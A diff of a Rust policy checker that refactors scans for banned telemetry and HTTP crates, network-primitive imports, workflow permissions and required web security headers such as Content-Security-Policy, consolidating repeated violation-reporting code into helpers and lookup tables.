@@ -2,9 +2,13 @@
 //! networking policy across manifests, Rust sources, workflows, and web security headers (`R0.6`).
 
 use std::collections::BTreeMap;
-use std::path::{Path, PathBuf};
+use std::path::Path;
 
 use crate::rust_lex::{RustLexer, StrippedRust, is_ident_byte, strip_non_prod_rust_both as strip_non_prod_rust};
+use crate::scan_util::{
+    format_error_list, has_ext_ci, is_real_dir, lower_ext, next_ident_pattern_match, rel_slash_lossy, strip_toml_comment, unquote_scalar,
+    walk_file_paths, walk_rel_files,
+};
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 struct LockPackage {
@@ -13,18 +17,11 @@ struct LockPackage {
     source: Option<String>,
 }
 
-use crate::scan_util::strip_toml_comment;
-
 fn parse_section_header(line: &str) -> Option<&str> {
     if line.starts_with("[[") {
         return None;
     }
     line.strip_prefix('[')?.strip_suffix(']').map(str::trim)
-}
-
-fn unquote_toml_str(s: &str) -> String {
-    let t = s.trim();
-    t.strip_prefix('"').and_then(|r| r.strip_suffix('"')).or_else(|| t.strip_prefix('\'').and_then(|r| r.strip_suffix('\''))).unwrap_or(t).to_owned()
 }
 
 fn extract_first_quoted(s: &str) -> String {
@@ -42,31 +39,24 @@ fn parse_cargo_lock(lock_text: &str) -> Vec<LockPackage> {
 
     for raw in lock_text.lines() {
         let line = raw.trim();
-        if line == "[[package]]" {
+        if line == "[[package]]" || line.starts_with('[') {
             if let Some(pkg) = current.take()
                 && !pkg.name.is_empty()
             {
                 pkgs.push(pkg);
             }
-            current = Some(LockPackage { name: String::new(), version: String::new(), source: None });
-            continue;
-        }
-        if line.starts_with('[') {
-            if let Some(pkg) = current.take()
-                && !pkg.name.is_empty()
-            {
-                pkgs.push(pkg);
+            if line == "[[package]]" {
+                current = Some(LockPackage { name: String::new(), version: String::new(), source: None });
             }
             continue;
         }
-        let Some(pkg) = current.as_mut() else {
-            continue;
-        };
-        if let Some((k, v)) = line.split_once('=') {
+        if let Some(pkg) = current.as_mut()
+            && let Some((k, v)) = line.split_once('=')
+        {
             match k.trim() {
-                "name" => pkg.name = unquote_toml_str(v.trim()),
-                "version" => pkg.version = unquote_toml_str(v.trim()),
-                "source" => pkg.source = Some(unquote_toml_str(v.trim())),
+                "name" => pkg.name = unquote_scalar(v).to_owned(),
+                "version" => pkg.version = unquote_scalar(v).to_owned(),
+                "source" => pkg.source = Some(unquote_scalar(v).to_owned()),
                 _ => {}
             }
         }
@@ -173,6 +163,10 @@ impl std::fmt::Display for TelemetryViolation {
     }
 }
 
+fn push_v(out: &mut Vec<TelemetryViolation>, check: u8, path: &str, line: usize, detail: impl Into<String>) {
+    out.push(TelemetryViolation { check, path: path.to_owned(), line, detail: detail.into() });
+}
+
 #[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
 pub struct TelemetryStats {
     pub manifests: usize,
@@ -196,8 +190,7 @@ pub fn run(root: &Path, args: &[String]) -> Result<(), String> {
         );
         return Ok(());
     }
-    let lines: Vec<String> = violations.iter().map(ToString::to_string).collect();
-    Err(format!("{} zero-telemetry violation(s) found:\n  {}", violations.len(), lines.join("\n  ")))
+    Err(format_error_list("zero-telemetry violation(s) found", &violations))
 }
 
 /// Run all five zero-telemetry policy checks against `root`.
@@ -218,14 +211,14 @@ pub fn run_checks(root: &Path) -> Result<(TelemetryStats, Vec<TelemetryViolation
 /// Check 1: scan all workspace `Cargo.toml` manifests and `Cargo.lock` for banned crates.
 fn check_banned_crates(root: &Path, violations: &mut Vec<TelemetryViolation>, lock_count: &mut usize) -> Result<usize, String> {
     let mut manifests = Vec::new();
-    collect_files_named(root, "Cargo.toml", &mut manifests)?;
+    walk_file_paths(root, &skip_workspace_dir, &|p| p.file_name().is_some_and(|n| n == "Cargo.toml"), &mut manifests)?;
     manifests.sort();
     if manifests.is_empty() {
         return Err(String::from("no Cargo.toml manifests found in workspace"));
     }
 
     for manifest in &manifests {
-        let rel = rel_slash(root, manifest);
+        let rel = rel_slash_lossy(root, manifest);
         let text = std::fs::read_to_string(manifest).map_err(|e| format!("{rel}: {e}"))?;
         scan_manifest_for_banned_crates(&rel, &text, violations);
     }
@@ -260,12 +253,7 @@ fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<T
                 if let Some(dep_name) = section_dependency_name(&section)
                     && is_banned_crate_name(dep_name)
                 {
-                    violations.push(TelemetryViolation {
-                        check: 1,
-                        path: rel.to_owned(),
-                        line: line_no,
-                        detail: format!("banned telemetry/HTTP crate `{dep_name}` in section `[{section}]`"),
-                    });
+                    push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` in section `[{section}]`"));
                 }
                 continue;
             }
@@ -280,21 +268,11 @@ fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<T
                 && let Some(pkg) = extract_inline_package_name(line, true)
                 && is_banned_crate_name(&pkg)
             {
-                violations.push(TelemetryViolation {
-                    check: 1,
-                    path: rel.to_owned(),
-                    line: line_no,
-                    detail: format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"),
-                });
+                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
             }
             if in_web_sys_entry {
                 for feat in extract_banned_web_sys_features(line) {
-                    violations.push(TelemetryViolation {
-                        check: 1,
-                        path: rel.to_owned(),
-                        line: line_no,
-                        detail: format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"),
-                    });
+                    push_v(violations, 1, rel, line_no, format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"));
                 }
             }
             update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
@@ -309,40 +287,25 @@ fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<T
             update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
             continue;
         };
-        let key = unquote_toml_str(lhs.trim());
+        let key = unquote_scalar(lhs);
         let rhs = rhs.trim();
         let is_web_sys_section =
             section_dependency_name(&section).is_some_and(|n| n.eq_ignore_ascii_case("web-sys") || n.eq_ignore_ascii_case("web_sys"));
-        if key != "package" && is_banned_crate_name(&key) {
-            violations.push(TelemetryViolation {
-                check: 1,
-                path: rel.to_owned(),
-                line: line_no,
-                detail: format!("banned telemetry/HTTP crate `{key}` in `Cargo.toml`"),
-            });
+        if key != "package" && is_banned_crate_name(key) {
+            push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{key}` in `Cargo.toml`"));
         }
         if (key == "package" && section_dependency_name(&section).is_some()) || rhs.starts_with('{') {
-            let pkg_opt = if key == "package" { Some(unquote_toml_str(rhs)) } else { extract_inline_package_name(rhs, false) };
+            let pkg_opt = if key == "package" { Some(unquote_scalar(rhs).to_owned()) } else { extract_inline_package_name(rhs, false) };
             if let Some(pkg) = pkg_opt
                 && is_banned_crate_name(&pkg)
             {
-                violations.push(TelemetryViolation {
-                    check: 1,
-                    path: rel.to_owned(),
-                    line: line_no,
-                    detail: format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"),
-                });
+                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
             }
         }
         let is_web_sys_line = key == "web-sys" || key == "web_sys" || (is_web_sys_section && key == "features");
         if is_web_sys_line {
             for feat in extract_banned_web_sys_features(rhs) {
-                violations.push(TelemetryViolation {
-                    check: 1,
-                    path: rel.to_owned(),
-                    line: line_no,
-                    detail: format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"),
-                });
+                push_v(violations, 1, rel, line_no, format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"));
             }
         }
         update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
@@ -420,20 +383,14 @@ fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[LockPackage], viola
             && let Some((k, v)) = line.split_once('=')
             && k.trim() == "name"
         {
-            let name = unquote_toml_str(v.trim());
-            pkg_lines.entry(name).or_default().push(idx + 1);
+            pkg_lines.entry(unquote_scalar(v).to_owned()).or_default().push(idx + 1);
         }
     }
 
     for pkg in lock_pkgs {
         if is_banned_crate_name(&pkg.name) {
             let line = pkg_lines.get(&pkg.name).and_then(|v| v.first().copied()).unwrap_or(1);
-            violations.push(TelemetryViolation {
-                check: 1,
-                path: String::from("Cargo.lock"),
-                line,
-                detail: format!("banned telemetry/HTTP crate `{}` ({}) in Cargo.lock", pkg.name, pkg.version),
-            });
+            push_v(violations, 1, "Cargo.lock", line, format!("banned telemetry/HTTP crate `{}` ({}) in Cargo.lock", pkg.name, pkg.version));
         }
     }
 }
@@ -561,19 +518,26 @@ fn check_rust_network_use_imports(rel: &str, prod_code: &str, violations: &mut V
         "std::os::unix::net::*",
         "os::unix::net",
         "unix::net",
-        "web_sys::WebSocket",
-        "web_sys::EventSource",
-        "web_sys::XmlHttpRequest",
-        "web_sys::Request",
-        "web_sys::RequestInit",
-        "web_sys::RequestMode",
-        "web_sys::Response",
-        "web_sys::Headers",
-        "web_sys::Navigator",
-        "web_sys::Worker",
-        "web_sys::SharedWorker",
-        "web_sys::ServiceWorkerContainer",
         "web_sys::*",
+    ];
+    const BANNED_NET_LEAVES: &[&str] = &[
+        "UdpSocket",
+        "ToSocketAddrs",
+        "UnixStream",
+        "UnixListener",
+        "UnixDatagram",
+        "WebSocket",
+        "EventSource",
+        "XmlHttpRequest",
+        "Request",
+        "RequestInit",
+        "RequestMode",
+        "Response",
+        "Headers",
+        "Navigator",
+        "Worker",
+        "SharedWorker",
+        "ServiceWorkerContainer",
     ];
     for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
         let mut items = Vec::new();
@@ -583,44 +547,11 @@ fn check_rust_network_use_imports(rel: &str, prod_code: &str, violations: &mut V
             let matched =
                 ALWAYS_BANNED_IMPORT_ITEMS.iter().find(|&&p| norm == p).or_else(|| (norm == "web_sys" && item.alias.is_some()).then_some(&"web_sys"));
             if let Some(pat) = matched {
-                violations.push(TelemetryViolation {
-                    check: 2,
-                    path: rel.to_owned(),
-                    line,
-                    detail: format!("banned network socket primitive import `{pat}`"),
-                });
-                continue;
-            }
-            if ["std::net::", "core::net::", "std::os::unix::net::", "web_sys::"].iter().any(|p| norm.starts_with(p))
-                && norm.rsplit("::").next().is_some_and(|leaf| {
-                    matches!(
-                        leaf,
-                        "UdpSocket"
-                            | "ToSocketAddrs"
-                            | "UnixStream"
-                            | "UnixListener"
-                            | "UnixDatagram"
-                            | "WebSocket"
-                            | "EventSource"
-                            | "XmlHttpRequest"
-                            | "Request"
-                            | "RequestInit"
-                            | "RequestMode"
-                            | "Response"
-                            | "Headers"
-                            | "Navigator"
-                            | "Worker"
-                            | "SharedWorker"
-                            | "ServiceWorkerContainer"
-                    )
-                })
+                push_v(violations, 2, rel, line, format!("banned network socket primitive import `{pat}`"));
+            } else if ["std::net::", "core::net::", "std::os::unix::net::", "web_sys::"].iter().any(|p| norm.starts_with(p))
+                && norm.rsplit("::").next().is_some_and(|leaf| BANNED_NET_LEAVES.contains(&leaf))
             {
-                violations.push(TelemetryViolation {
-                    check: 2,
-                    path: rel.to_owned(),
-                    line,
-                    detail: format!("banned network socket primitive import `{norm}`"),
-                });
+                push_v(violations, 2, rel, line, format!("banned network socket primitive import `{norm}`"));
             }
         }
     }
@@ -965,26 +896,19 @@ fn scan_code_patterns_with_lines(
     }
 }
 
+fn skip_workspace_dir(path: &Path) -> bool {
+    path.file_name().and_then(|n| n.to_str()).is_some_and(|s| matches!(s, "target" | "dist" | "corpus") || s.starts_with('.'))
+}
+
 fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
-    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
-    for entry in entries {
-        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
-        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
-        let path = entry.path();
-        let name = entry.file_name();
-        let name_str = name.to_string_lossy();
-        if ft.is_dir() {
-            if name_str == "target" || name_str == "dist" || name_str == "corpus" || name_str.starts_with('.') {
-                continue;
-            }
-            collect_non_test_src_rs_files(root, &path, out)?;
-        } else if ft.is_file() && path.extension().and_then(|e| e.to_str()) == Some("rs") {
-            let rel = rel_slash(root, &path);
-            let is_prod_src = rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs");
-            let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
-            if is_prod_src || is_build_rs {
-                out.push(rel);
-            }
+    let mut paths = Vec::new();
+    walk_file_paths(dir, &skip_workspace_dir, &|p| has_ext_ci(p, &["rs"]), &mut paths)?;
+    for path in paths {
+        let rel = rel_slash_lossy(root, &path);
+        let is_prod_src = rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs");
+        let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
+        if is_prod_src || is_build_rs {
+            out.push(rel);
         }
     }
     Ok(())
@@ -996,8 +920,14 @@ fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryV
     let mut targets = collect_workflow_and_action_files(root)?;
     for dir_name in ["apps/curvebook-web", "packaging"] {
         let dir = root.join(dir_name);
-        if std::fs::symlink_metadata(&dir).is_ok_and(|m| m.is_dir()) {
-            collect_all_files_under(root, &dir, &mut targets)?;
+        if is_real_dir(&dir) {
+            walk_rel_files(
+                root,
+                &dir,
+                &|p| p.file_name().and_then(|n| n.to_str()).is_some_and(|s| matches!(s, "target" | "dist" | ".git")),
+                &|_| true,
+                &mut targets,
+            )?;
         }
     }
     targets.sort();
@@ -1030,12 +960,7 @@ fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryV
 
     let index_rel = "apps/curvebook-web/index.html";
     if !root.join(index_rel).is_file() {
-        violations.push(TelemetryViolation {
-            check: 3,
-            path: index_rel.to_owned(),
-            line: 1,
-            detail: String::from("missing apps/curvebook-web/index.html"),
-        });
+        push_v(violations, 3, index_rel, 1, "missing apps/curvebook-web/index.html");
     }
     for (rel, text) in web_asset_files {
         scan_web_asset_external_urls_and_apis(&rel, &text, violations);
@@ -1045,8 +970,10 @@ fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryV
 }
 
 fn is_binary_web_asset_blob(rel: &str, bytes: &[u8]) -> bool {
-    let ext = Path::new(rel).extension().and_then(|e| e.to_str()).map(str::to_ascii_lowercase).unwrap_or_default();
-    if matches!(ext.as_str(), "png" | "jpg" | "jpeg" | "gif" | "webp" | "ico" | "icns" | "ttf" | "otf" | "woff" | "woff2" | "wasm" | "zip" | "pdf") {
+    if matches!(
+        lower_ext(rel).as_str(),
+        "png" | "jpg" | "jpeg" | "gif" | "webp" | "ico" | "icns" | "ttf" | "otf" | "woff" | "woff2" | "wasm" | "zip" | "pdf"
+    ) {
         return true;
     }
     !is_web_asset_file(rel)
@@ -1054,21 +981,12 @@ fn is_binary_web_asset_blob(rel: &str, bytes: &[u8]) -> bool {
 }
 
 fn is_web_asset_file(rel: &str) -> bool {
-    let in_web = rel.starts_with("apps/curvebook-web/") || rel.starts_with("packaging/web/");
-    if !in_web {
-        return false;
-    }
-    matches!(
-        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
-        Some("html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "css" | "svg" | "json")
-    )
+    (rel.starts_with("apps/curvebook-web/") || rel.starts_with("packaging/web/"))
+        && matches!(lower_ext(rel).as_str(), "html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "css" | "svg" | "json")
 }
 
 fn is_browser_markup_or_script(rel: &str) -> bool {
-    matches!(
-        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
-        Some("html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "svg")
-    )
+    matches!(lower_ext(rel).as_str(), "html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "svg")
 }
 
 fn normalize_js_member_syntax(lower_line: &str) -> String {
@@ -1331,7 +1249,7 @@ fn split_yaml_unquoted_key(trimmed: &str) -> Option<(&str, &str)> {
             quote = Some(b);
         } else if b == b':' && bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) {
             let (raw_key, after_colon) = trimmed.split_at_checked(i)?;
-            let key = unquote_yaml_scalar(raw_key.trim());
+            let key = unquote_scalar(raw_key.trim());
             let rhs = after_colon.strip_prefix(':').unwrap_or(after_colon).trim();
             return Some((key, rhs));
         }
@@ -1457,7 +1375,7 @@ fn handle_permissions_line(
     if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
         && key == "permissions"
     {
-        let clean_rhs = unquote_yaml_scalar(rhs);
+        let clean_rhs = unquote_scalar(rhs);
         let is_top = indent == 0;
         if is_top {
             state.saw_top_permissions = true;
@@ -1514,8 +1432,8 @@ fn validate_permission_entry(
     state: &mut WorkflowParseState,
     violations: &mut Vec<TelemetryViolation>,
 ) {
-    let clean_scope = unquote_yaml_scalar(scope);
-    let clean_level = unquote_yaml_scalar(level);
+    let clean_scope = unquote_scalar(scope);
+    let clean_level = unquote_scalar(level);
     if is_top && clean_scope == "contents" && clean_level == "read" {
         state.top_has_contents_read = true;
     }
@@ -1556,7 +1474,7 @@ fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &m
     if key != "uses" {
         return;
     }
-    let spec = unquote_yaml_scalar(rhs);
+    let spec = unquote_scalar(rhs);
     if spec.starts_with("./") || spec.starts_with("../") {
         return;
     }
@@ -1698,40 +1616,20 @@ fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations
 
 /// Check 5: static web security & anti-telemetry headers in `packaging/web/_headers` and `packaging/web/.htaccess`.
 fn check_web_security_headers(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
+    type Parser = fn(&str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>);
+    let configs: &[(&str, Parser)] = &[("packaging/web/_headers", parse_netlify_header_blocks), ("packaging/web/.htaccess", parse_htaccess_headers)];
     let mut count = 0usize;
-
-    let headers_rel = "packaging/web/_headers";
-    let headers_path = root.join(headers_rel);
-    if !headers_path.is_file() {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: headers_rel.to_owned(),
-            line: 1,
-            detail: String::from("missing packaging/web/_headers"),
-        });
-    } else {
-        count += 1;
-        let text = std::fs::read_to_string(&headers_path).map_err(|e| format!("{headers_rel}: {e}"))?;
-        let (global_map, all_entries) = parse_netlify_header_blocks(&text);
-        validate_required_web_headers(headers_rel, &global_map, &all_entries, violations);
+    for &(rel, parser) in configs {
+        let path = root.join(rel);
+        if !path.is_file() {
+            push_v(violations, 5, rel, 1, format!("missing {rel}"));
+        } else {
+            count += 1;
+            let text = std::fs::read_to_string(&path).map_err(|e| format!("{rel}: {e}"))?;
+            let (global_map, all_entries) = parser(&text);
+            validate_required_web_headers(rel, &global_map, &all_entries, violations);
+        }
     }
-
-    let htaccess_rel = "packaging/web/.htaccess";
-    let htaccess_path = root.join(htaccess_rel);
-    if !htaccess_path.is_file() {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: htaccess_rel.to_owned(),
-            line: 1,
-            detail: String::from("missing packaging/web/.htaccess"),
-        });
-    } else {
-        count += 1;
-        let text = std::fs::read_to_string(&htaccess_path).map_err(|e| format!("{htaccess_rel}: {e}"))?;
-        let (global_map, all_entries) = parse_htaccess_headers(&text);
-        validate_required_web_headers(htaccess_rel, &global_map, &all_entries, violations);
-    }
-
     Ok(count)
 }
 
@@ -1780,24 +1678,19 @@ fn parse_htaccess_headers(text: &str) -> (BTreeMap<String, (usize, String)>, Vec
 }
 
 fn parse_apache_header_set(trimmed: &str) -> Option<(String, String)> {
-    let mut rest = trimmed;
-    let first = next_ws_token(rest)?;
+    let first = next_ws_token(trimmed)?;
     if !first.0.eq_ignore_ascii_case("header") {
         return None;
     }
-    rest = first.1.trim_start();
-    let mut tok = next_ws_token(rest)?;
+    let mut tok = next_ws_token(first.1.trim_start())?;
     if tok.0.eq_ignore_ascii_case("always") || tok.0.eq_ignore_ascii_case("onsuccess") {
-        rest = tok.1.trim_start();
-        tok = next_ws_token(rest)?;
+        tok = next_ws_token(tok.1.trim_start())?;
     }
     if !matches!(tok.0.to_ascii_lowercase().as_str(), "set" | "setifempty" | "add" | "append") {
         return None;
     }
-    rest = tok.1.trim_start();
-    let (name, val_part) = next_ws_token(rest)?;
-    let val = unquote_apache_value(val_part.trim());
-    Some((name.to_owned(), val))
+    let (name, val_part) = next_ws_token(tok.1.trim_start())?;
+    Some((name.to_owned(), unquote_scalar(val_part).to_owned()))
 }
 
 fn next_ws_token(s: &str) -> Option<(&str, &str)> {
@@ -1811,105 +1704,45 @@ fn next_ws_token(s: &str) -> Option<(&str, &str)> {
     }
 }
 
-fn unquote_apache_value(val: &str) -> String {
-    val.strip_prefix('"')
-        .and_then(|s| s.strip_suffix('"'))
-        .or_else(|| val.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
-        .unwrap_or(val)
-        .to_owned()
-}
-
 fn validate_required_web_headers(
     rel: &str,
     headers: &BTreeMap<String, (usize, String)>,
     all_entries: &[HeaderEntry],
     violations: &mut Vec<TelemetryViolation>,
 ) {
-    if !headers.contains_key("content-security-policy") {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: rel.to_owned(),
-            line: 1,
-            detail: String::from("missing `Content-Security-Policy` header"),
-        });
+    const REQUIRED: &[(&str, &str)] = &[
+        ("content-security-policy", "missing `Content-Security-Policy` header"),
+        ("referrer-policy", "missing `Referrer-Policy: no-referrer` header"),
+        ("permissions-policy", "missing `Permissions-Policy` header"),
+        ("x-content-type-options", "missing `X-Content-Type-Options: nosniff` header"),
+        ("cross-origin-opener-policy", "missing `Cross-Origin-Opener-Policy: same-origin` header"),
+        ("cross-origin-embedder-policy", "missing `Cross-Origin-Embedder-Policy: require-corp` header"),
+    ];
+    const EXACT_VALS: &[(&str, &str, &str)] = &[
+        ("referrer-policy", "Referrer-Policy", "no-referrer"),
+        ("x-content-type-options", "X-Content-Type-Options", "nosniff"),
+        ("cross-origin-opener-policy", "Cross-Origin-Opener-Policy", "same-origin"),
+        ("cross-origin-embedder-policy", "Cross-Origin-Embedder-Policy", "require-corp"),
+    ];
+    for &(key, msg) in REQUIRED {
+        if !headers.contains_key(key) {
+            push_v(violations, 5, rel, 1, msg);
+        }
     }
-    if !headers.contains_key("referrer-policy") {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: rel.to_owned(),
-            line: 1,
-            detail: String::from("missing `Referrer-Policy: no-referrer` header"),
-        });
-    }
-    if !headers.contains_key("permissions-policy") {
-        violations.push(TelemetryViolation { check: 5, path: rel.to_owned(), line: 1, detail: String::from("missing `Permissions-Policy` header") });
-    }
-    if !headers.contains_key("x-content-type-options") {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: rel.to_owned(),
-            line: 1,
-            detail: String::from("missing `X-Content-Type-Options: nosniff` header"),
-        });
-    }
-    if !headers.contains_key("cross-origin-opener-policy") {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: rel.to_owned(),
-            line: 1,
-            detail: String::from("missing `Cross-Origin-Opener-Policy: same-origin` header"),
-        });
-    }
-    if !headers.contains_key("cross-origin-embedder-policy") {
-        violations.push(TelemetryViolation {
-            check: 5,
-            path: rel.to_owned(),
-            line: 1,
-            detail: String::from("missing `Cross-Origin-Embedder-Policy: require-corp` header"),
-        });
-    }
-
     for (key, line, val) in all_entries {
-        match key.as_str() {
-            "content-security-policy" => validate_csp_directives(rel, *line, val, violations),
-            "referrer-policy" if !val.trim().eq_ignore_ascii_case("no-referrer") => violations.push(TelemetryViolation {
-                check: 5,
-                path: rel.to_owned(),
-                line: *line,
-                detail: format!("`Referrer-Policy` must be `no-referrer`, found `{val}`"),
-            }),
-            "permissions-policy" => {
-                let compact: String = val.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
-                for feature in ["camera=()", "microphone=()", "geolocation=()"] {
-                    if !compact.contains(feature) {
-                        violations.push(TelemetryViolation {
-                            check: 5,
-                            path: rel.to_owned(),
-                            line: *line,
-                            detail: format!("`Permissions-Policy` must disable `{feature}`"),
-                        });
-                    }
+        if key == "content-security-policy" {
+            validate_csp_directives(rel, *line, val, violations);
+        } else if key == "permissions-policy" {
+            let compact: String = val.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
+            for feature in ["camera=()", "microphone=()", "geolocation=()"] {
+                if !compact.contains(feature) {
+                    push_v(violations, 5, rel, *line, format!("`Permissions-Policy` must disable `{feature}`"));
                 }
             }
-            "x-content-type-options" if !val.trim().eq_ignore_ascii_case("nosniff") => violations.push(TelemetryViolation {
-                check: 5,
-                path: rel.to_owned(),
-                line: *line,
-                detail: format!("`X-Content-Type-Options` must be `nosniff`, found `{val}`"),
-            }),
-            "cross-origin-opener-policy" if !val.trim().eq_ignore_ascii_case("same-origin") => violations.push(TelemetryViolation {
-                check: 5,
-                path: rel.to_owned(),
-                line: *line,
-                detail: format!("`Cross-Origin-Opener-Policy` must be `same-origin`, found `{val}`"),
-            }),
-            "cross-origin-embedder-policy" if !val.trim().eq_ignore_ascii_case("require-corp") => violations.push(TelemetryViolation {
-                check: 5,
-                path: rel.to_owned(),
-                line: *line,
-                detail: format!("`Cross-Origin-Embedder-Policy` must be `require-corp`, found `{val}`"),
-            }),
-            _ => {}
+        } else if let Some(&(_, display, expected)) = EXACT_VALS.iter().find(|&&(k, _, _)| k == key)
+            && !val.trim().eq_ignore_ascii_case(expected)
+        {
+            push_v(violations, 5, rel, *line, format!("`{display}` must be `{expected}`, found `{val}`"));
         }
     }
 }
@@ -1920,15 +1753,9 @@ fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut V
 
     for required in REQUIRED_CSP_DIRECTIVES {
         if !directives.iter().any(|d| d == required) {
-            violations.push(TelemetryViolation {
-                check: 5,
-                path: rel.to_owned(),
-                line,
-                detail: format!("`Content-Security-Policy` missing exact directive `{required}`"),
-            });
+            push_v(violations, 5, rel, line, format!("`Content-Security-Policy` missing exact directive `{required}`"));
         }
     }
-
     for dir in &directives {
         let dir_name = dir.split_whitespace().next().unwrap_or("");
         for tok in dir.split_whitespace().skip(1) {
@@ -1936,12 +1763,7 @@ fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut V
             let allowed_blob = tok == "blob:" && dir_name == "img-src";
             let is_scheme_source = tok.ends_with(':') && !allowed_data && !allowed_blob;
             if tok.contains("://") || tok.starts_with("//") || tok.contains('*') || is_scheme_source || tok == "'unsafe-eval'" {
-                violations.push(TelemetryViolation {
-                    check: 5,
-                    path: rel.to_owned(),
-                    line,
-                    detail: format!("`Content-Security-Policy` forbids external/unsafe source `{tok}` in `{dir}`"),
-                });
+                push_v(violations, 5, rel, line, format!("`Content-Security-Policy` forbids external/unsafe source `{tok}` in `{dir}`"));
             }
         }
     }
@@ -1949,113 +1771,17 @@ fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut V
 
 fn collect_workflow_and_action_files(root: &Path) -> Result<Vec<String>, String> {
     let mut out = Vec::new();
-    let wf_dir = root.join(".github").join("workflows");
-    if std::fs::symlink_metadata(&wf_dir).is_ok_and(|m| m.is_dir()) {
-        let entries = std::fs::read_dir(&wf_dir).map_err(|e| format!("read_dir .github/workflows: {e}"))?;
-        for entry in entries {
-            let entry = entry.map_err(|e| format!("dir entry .github/workflows: {e}"))?;
-            let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
-            let path = entry.path();
-            if ft.is_file()
-                && path.extension().and_then(|e| e.to_str()).is_some_and(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"))
-            {
-                out.push(rel_slash(root, &path));
-            }
-        }
+    let wf_dir = root.join(".github/workflows");
+    if is_real_dir(&wf_dir) {
+        walk_rel_files(root, &wf_dir, &|_| true, &|p| has_ext_ci(p, &["yml", "yaml"]), &mut out)?;
     }
-    let actions_dir = root.join(".github").join("actions");
-    if std::fs::symlink_metadata(&actions_dir).is_ok_and(|m| m.is_dir()) {
-        collect_yaml_files_under(root, &actions_dir, &mut out)?;
+    let actions_dir = root.join(".github/actions");
+    if is_real_dir(&actions_dir) {
+        walk_rel_files(root, &actions_dir, &|_| false, &|p| has_ext_ci(p, &["yml", "yaml"]), &mut out)?;
     }
     out.sort();
     out.dedup();
     Ok(out)
-}
-
-fn collect_yaml_files_under(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
-    for entry in std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))? {
-        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
-        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
-        let path = entry.path();
-        if ft.is_dir() {
-            collect_yaml_files_under(root, &path, out)?;
-        } else if ft.is_file()
-            && path.extension().and_then(|e| e.to_str()).is_some_and(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"))
-        {
-            out.push(rel_slash(root, &path));
-        }
-    }
-    Ok(())
-}
-
-fn collect_files_named(dir: &Path, target_name: &str, out: &mut Vec<PathBuf>) -> Result<(), String> {
-    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
-    for entry in entries {
-        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
-        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
